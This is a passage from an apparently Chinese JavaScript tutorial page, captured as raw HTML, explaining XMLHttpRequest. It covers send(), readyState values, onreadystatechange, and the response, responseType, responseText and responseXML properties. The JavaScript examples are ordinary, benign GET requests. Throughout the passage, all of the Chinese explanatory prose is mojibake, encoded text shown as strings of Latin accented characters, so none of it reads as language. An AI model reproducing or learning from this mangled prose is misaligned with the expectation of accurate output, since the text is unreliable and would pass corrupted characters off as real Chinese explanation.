</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œä¸€æ—¦<code>XMLHttpRequest</code>å®ä¾‹çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–ï¼Œå°±ä¼šè°ƒç”¨ç›‘å¬å‡½æ•°<code>handleStateChange</code></p> <p>æœ€åä½¿ç”¨<code>send()</code>æ–¹æ³•ï¼Œå®é™…å‘å‡ºè¯·æ±‚ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>send()</code>çš„å‚æ•°ä¸º<code>null</code>ï¼Œè¡¨ç¤ºå‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸å¸¦æœ‰æ•°æ®ä½“ã€‚å¦‚æœå‘é€çš„æ˜¯ POST è¯·æ±‚ï¼Œè¿™é‡Œå°±éœ€è¦æŒ‡å®šæ•°æ®ä½“ã€‚</p> <p>ä¸€æ—¦æ‹¿åˆ°æœåŠ¡å™¨è¿”å›çš„æ•°æ®ï¼ŒAJAX ä¸ä¼šåˆ·æ–°æ•´ä¸ªç½‘é¡µï¼Œè€Œæ˜¯åªæ›´æ–°ç½‘é¡µé‡Œé¢çš„ç›¸å…³éƒ¨åˆ†ï¼Œä»è€Œä¸æ‰“æ–­ç”¨æˆ·æ­£åœ¨åšçš„äº‹æƒ…ã€‚</p> <p>æ³¨æ„ï¼ŒAJAX åªèƒ½å‘åŒæºç½‘å€ï¼ˆåè®®ã€åŸŸåã€ç«¯å£éƒ½ç›¸åŒï¼‰å‘å‡º HTTP è¯·æ±‚ï¼Œå¦‚æœå‘å‡ºè·¨åŸŸè¯·æ±‚ï¼Œå°±ä¼šæŠ¥é”™ï¼ˆè¯¦è§ã€ŠåŒæºæ”¿ç­–ã€‹å’Œã€ŠCORS é€šä¿¡ã€‹ä¸¤ç« ï¼‰ã€‚</p> <p>ä¸‹é¢æ˜¯<code>XMLHttpRequest</code>å¯¹è±¡ç®€å•ç”¨æ³•çš„å®Œæ•´ä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token comment">// é€šä¿¡æˆåŠŸæ—¶ï¼ŒçŠ¶æ€å€¼ä¸º4</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>statusText<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>statusText<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'/endpoint'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h2 id="_2-xmlhttprequest-çš„å®ä¾‹å±æ€§"><a href="#_2-xmlhttprequest-çš„å®ä¾‹å±æ€§" class="header-anchor">#</a> 2.XMLHttpRequest çš„å®ä¾‹å±æ€§</h2> <h3 id="xmlhttprequest-readystate"><a href="#xmlhttprequest-readystate" class="header-anchor">#</a> XMLHttpRequest.readyState</h3> <p><code>XMLHttpRequest.readyState</code>è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„å½“å‰çŠ¶æ€ã€‚è¯¥å±æ€§åªè¯»ã€‚å®ƒå¯èƒ½è¿”å›ä»¥ä¸‹å€¼ã€‚</p> <ul><li>0ï¼Œè¡¨ç¤º XMLHttpRequest å®ä¾‹å·²ç»ç”Ÿæˆï¼Œä½†æ˜¯å®ä¾‹çš„<code>open()</code>æ–¹æ³•è¿˜æ²¡æœ‰è¢«è°ƒç”¨ã€‚</li> <li>1ï¼Œè¡¨ç¤º<code>open()</code>æ–¹æ³•å·²ç»è°ƒç”¨ï¼Œä½†æ˜¯å®ä¾‹çš„<code>send()</code>æ–¹æ³•è¿˜æ²¡æœ‰è°ƒç”¨ï¼Œä»ç„¶å¯ä»¥ä½¿ç”¨å®ä¾‹çš„<code>setRequestHeader()</code>æ–¹æ³•ï¼Œè®¾å®š HTTP è¯·æ±‚çš„å¤´ä¿¡æ¯ã€‚</li> <li>2ï¼Œè¡¨ç¤ºå®ä¾‹çš„<code>send()</code>æ–¹æ³•å·²ç»è°ƒç”¨ï¼Œå¹¶ä¸”æœåŠ¡å™¨è¿”å›çš„å¤´ä¿¡æ¯å’ŒçŠ¶æ€ç å·²ç»æ”¶åˆ°ã€‚</li> <li>3ï¼Œè¡¨ç¤ºæ­£åœ¨æ¥æ”¶æœåŠ¡å™¨ä¼ æ¥çš„æ•°æ®ä½“ï¼ˆbody éƒ¨åˆ†ï¼‰ã€‚è¿™æ—¶ï¼Œå¦‚æœå®ä¾‹çš„<code>responseType</code>å±æ€§ç­‰äº<code>text</code>æˆ–è€…ç©ºå­—ç¬¦ä¸²ï¼Œ<code>responseText</code>å±æ€§å°±ä¼šåŒ…å«å·²ç»æ”¶åˆ°çš„éƒ¨åˆ†ä¿¡æ¯ã€‚</li> <li>4ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›çš„æ•°æ®å·²ç»å®Œå…¨æ¥æ”¶ï¼Œæˆ–è€…æœ¬æ¬¡æ¥æ”¶å·²ç»å¤±è´¥ã€‚</li></ul> <p>é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œæ¯å½“å®ä¾‹å¯¹è±¡å‘ç”ŸçŠ¶æ€å˜åŒ–ï¼Œå®ƒçš„<code>readyState</code>å±æ€§çš„å€¼å°±ä¼šæ”¹å˜ã€‚è¿™ä¸ªå€¼æ¯ä¸€æ¬¡å˜åŒ–ï¼Œéƒ½ä¼šè§¦å‘<code>readyStateChange</code>äº‹ä»¶ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// è¯·æ±‚ç»“æŸï¼Œå¤„ç†æœåŠ¡å™¨è¿”å›çš„æ•°æ®</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token comment">// æ˜¾ç¤ºæç¤ºâ€œåŠ è½½ä¸­â€¦â€¦â€</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>xhr.readyState</code>ç­‰äº<code>4</code>æ—¶ï¼Œè¡¨æ˜è„šæœ¬å‘å‡ºçš„ HTTP è¯·æ±‚å·²ç»å®Œæˆã€‚å…¶ä»–æƒ…å†µï¼Œéƒ½è¡¨ç¤º HTTP è¯·æ±‚è¿˜åœ¨è¿›è¡Œä¸­ã€‚</p> <h3 id="xmlhttprequest-onreadystatechange"><a href="#xmlhttprequest-onreadystatechange" class="header-anchor">#</a> XMLHttpRequest.onreadystatechange</h3> <p><code>XMLHttpRequest.onreadystatechange</code>å±æ€§æŒ‡å‘ä¸€ä¸ªç›‘å¬å‡½æ•°ã€‚<code>readystatechange</code>äº‹ä»¶å‘ç”Ÿæ—¶ï¼ˆå®ä¾‹çš„<code>readyState</code>å±æ€§å˜åŒ–ï¼‰ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸ªå±æ€§ã€‚</p> <p>å¦å¤–ï¼Œå¦‚æœä½¿ç”¨å®ä¾‹çš„<code>abort()</code>æ–¹æ³•ï¼Œç»ˆæ­¢ XMLHttpRequest è¯·æ±‚ï¼Œä¹Ÿä¼šé€ æˆ<code>readyState</code>å±æ€§å˜åŒ–ï¼Œå¯¼è‡´è°ƒç”¨<code>XMLHttpRequest.onreadystatechange</code>å±æ€§ã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'http://example.com'</span> <span class="token punctuation">,</span> <span class="token boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">!==</span> <span class="token number">4</span> <span class="token operator">||</span> xhr<span class="token punctuation">.</span>status <span class="token operator">!==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h3 id="xmlhttprequest-response"><a href="#xmlhttprequest-response" class="header-anchor">#</a> XMLHttpRequest.response</h3> <p><code>XMLHttpRequest.response</code>å±æ€§è¡¨ç¤ºæœåŠ¡å™¨è¿”å›çš„æ•°æ®ä½“ï¼ˆå³ HTTP å›åº”çš„ body éƒ¨åˆ†ï¼‰ã€‚å®ƒå¯èƒ½æ˜¯ä»»ä½•æ•°æ®ç±»å‹ï¼Œæ¯”å¦‚å­—ç¬¦ä¸²ã€å¯¹è±¡ã€äºŒè¿›åˆ¶å¯¹è±¡ç­‰ç­‰ï¼Œå…·ä½“çš„ç±»å‹ç”±<code>XMLHttpRequest.responseType</code>å±æ€§å†³å®šã€‚è¯¥å±æ€§åªè¯»ã€‚</p> <p>å¦‚æœæœ¬æ¬¡è¯·æ±‚æ²¡æœ‰æˆåŠŸæˆ–è€…æ•°æ®ä¸å®Œæ•´ï¼Œè¯¥å±æ€§ç­‰äº<code>null</code>ã€‚ä½†æ˜¯ï¼Œå¦‚æœ<code>responseType</code>å±æ€§ç­‰äº<code>text</code>æˆ–ç©ºå­—ç¬¦ä¸²ï¼Œåœ¨è¯·æ±‚æ²¡æœ‰ç»“æŸä¹‹å‰ï¼ˆ<code>readyState</code>ç­‰äº3çš„é˜¶æ®µï¼‰ï¼Œ<code>response</code>å±æ€§åŒ…å«æœåŠ¡å™¨å·²ç»è¿”å›çš„éƒ¨åˆ†æ•°æ®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">handler</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="xmlhttprequest-responsetype"><a href="#xmlhttprequest-responsetype" class="header-anchor">#</a> XMLHttpRequest.responseType</h3> <p><code>XMLHttpRequest.responseType</code>å±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›æ•°æ®çš„ç±»å‹ã€‚è¿™ä¸ªå±æ€§æ˜¯å¯å†™çš„ï¼Œå¯ä»¥åœ¨è°ƒç”¨<code>open()</code>æ–¹æ³•ä¹‹åã€è°ƒç”¨<code>send()</code>æ–¹æ³•ä¹‹å‰ï¼Œè®¾ç½®è¿™ä¸ªå±æ€§çš„å€¼ï¼Œå‘Šè¯‰æœåŠ¡å™¨è¿”å›æŒ‡å®šç±»å‹çš„æ•°æ®ã€‚å¦‚æœ<code>responseType</code>è®¾ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå°±ç­‰åŒäºé»˜è®¤å€¼<code>text</code>ã€‚</p> <p><code>XMLHttpRequest.responseType</code>å±æ€§å¯ä»¥ç­‰äºä»¥ä¸‹å€¼ã€‚</p> <ul><li>&quot;&quot;ï¼ˆç©ºå­—ç¬¦ä¸²ï¼‰ï¼šç­‰åŒäº<code>text</code>ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›æ–‡æœ¬æ•°æ®ã€‚</li> <li>&quot;arraybuffer&quot;ï¼šArrayBuffer å¯¹è±¡ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›äºŒè¿›åˆ¶æ•°ç»„ã€‚</li> <li>&quot;blob&quot;ï¼šBlob å¯¹è±¡ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›äºŒè¿›åˆ¶å¯¹è±¡ã€‚</li> <li>&quot;document&quot;ï¼šDocument å¯¹è±¡ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›ä¸€ä¸ªæ–‡æ¡£å¯¹è±¡ã€‚</li> <li>&quot;json&quot;ï¼šJSON å¯¹è±¡ã€‚</li> <li>&quot;text&quot;ï¼šå­—ç¬¦ä¸²ã€‚</li></ul> <p>ä¸Šé¢å‡ ç§ç±»å‹ä¹‹ä¸­ï¼Œ<code>text</code>ç±»å‹é€‚åˆå¤§å¤šæ•°æƒ…å†µï¼Œè€Œä¸”ç›´æ¥å¤„ç†æ–‡æœ¬ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ã€‚<code>document</code>ç±»å‹é€‚åˆè¿”å› HTML / XML æ–‡æ¡£çš„æƒ…å†µï¼Œè¿™æ„å‘³ç€ï¼Œå¯¹äºé‚£äº›æ‰“å¼€ CORS çš„ç½‘ç«™ï¼Œå¯ä»¥ç›´æ¥ç”¨ Ajax æŠ“å–ç½‘é¡µï¼Œç„¶åä¸ç”¨è§£æ HTML å­—ç¬¦ä¸²ï¼Œç›´æ¥å¯¹æŠ“å–å›æ¥çš„æ•°æ®è¿›è¡Œ DOM æ“ä½œã€‚<code>blob</code>ç±»å‹é€‚åˆè¯»å–äºŒè¿›åˆ¶æ•°æ®ï¼Œæ¯”å¦‚å›¾ç‰‡æ–‡ä»¶ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'/path/to/image.png'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">'blob'</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>xhr<span class="token punctuation">.</span>response<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>type<span class="token operator">:</span> <span class="token string">'image/png'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// æˆ–è€…</span>
    <span class="token keyword">var</span> blob <span class="token operator">=</span> xhr<span class="token punctuation">.</span>response<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>å¦‚æœå°†è¿™ä¸ªå±æ€§è®¾ä¸º<code>ArrayBuffer</code>ï¼Œå°±å¯ä»¥æŒ‰ç…§æ•°ç»„çš„æ–¹å¼å¤„ç†äºŒè¿›åˆ¶æ•°æ®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'/path/to/image.png'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">'arraybuffer'</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> uInt8Array <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> uInt8Array<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// var byte = uInt8Array[i];</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>å¦‚æœå°†è¿™ä¸ªå±æ€§è®¾ä¸º<code>json</code>ï¼Œæµè§ˆå™¨å°±ä¼šè‡ªåŠ¨å¯¹è¿”å›æ•°æ®è°ƒç”¨<code>JSON.parse()</code>æ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»<code>xhr.response</code>å±æ€§ï¼ˆæ³¨æ„ï¼Œä¸æ˜¯<code>xhr.responseText</code>å±æ€§ï¼‰å¾—åˆ°çš„ä¸æ˜¯æ–‡æœ¬ï¼Œè€Œæ˜¯ä¸€ä¸ª JSON å¯¹è±¡ã€‚</p> <h3 id="xmlhttprequest-responsetext"><a href="#xmlhttprequest-responsetext" class="header-anchor">#</a> XMLHttpRequest.responseText</h3> <p><code>XMLHttpRequest.responseText</code>å±æ€§è¿”å›ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²ï¼Œè¯¥å±æ€§ä¸ºåªè¯»ã€‚åªæœ‰ HTTP è¯·æ±‚å®Œæˆæ¥æ”¶ä»¥åï¼Œè¯¥å±æ€§æ‰ä¼šåŒ…å«å®Œæ•´çš„æ•°æ®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'/server'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">'text'</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="xmlhttprequest-responsexml"><a href="#xmlhttprequest-responsexml" class="header-anchor">#</a> XMLHttpRequest.responseXML</h3> <p><code>XMLHttpRequest.responseXML</code>å±æ€§è¿”å›ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„ HTML æˆ– XML æ–‡æ¡£å¯¹è±¡ï¼Œè¯¥å±æ€§ä¸ºåªè¯»ã€‚å¦‚æœæœ¬æ¬¡è¯·æ±‚æ²¡æœ‰æˆåŠŸï¼Œæˆ–è€…æ”¶åˆ°çš„æ•°æ®ä¸èƒ½è¢«è§£æä¸º XML æˆ– HTMLï¼Œè¯¥å±æ€§ç­‰äº<code>null</code>ã€‚</p> <p>è¯¥å±æ€§ç”Ÿæ•ˆçš„å‰ææ˜¯ HTTP å›åº”çš„<code>Content-Type</code>å¤´ä¿¡æ¯ç­‰äº<code>text/xml</code>æˆ–<code>application/xml</code>ã€‚è¿™è¦æ±‚åœ¨å‘é€è¯·æ±‚å‰ï¼Œ<code>XMLHttpRequest.responseType</code>å±æ€§è¦è®¾ä¸º<code>document</code>ã€‚å¦‚æœ HTTP å›åº”çš„<code>Content-Type</code>å¤´ä¿¡æ¯ä¸ç­‰äº<code>text/xml</code>å’Œ<code>application/xml</code>ï¼Œä½†æ˜¯æƒ³ä»<code>responseXML</code>æ‹¿åˆ°æ•°æ®ï¼ˆå³æŠŠæ•°æ®æŒ‰ç…§ DOM æ ¼å¼è§£æï¼‰ï¼Œé‚£ä¹ˆéœ€è¦æ‰‹åŠ¨è°ƒç”¨<code>XMLHttpRequest.overrideMimeType()</code>æ–¹æ³•ï¼Œå¼ºåˆ¶è¿›è¡Œ XML è§£æã€‚</p> <p>è¯¥å±æ€§å¾—åˆ°çš„æ•°æ®ï¼Œæ˜¯ç›´æ¥è§£æåçš„æ–‡æ¡£ DOM æ ‘ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'/server'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">'document'</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">overrideMimeType</span><span class="token punctuation">(</span><span class="token string">'text/xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseXML<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

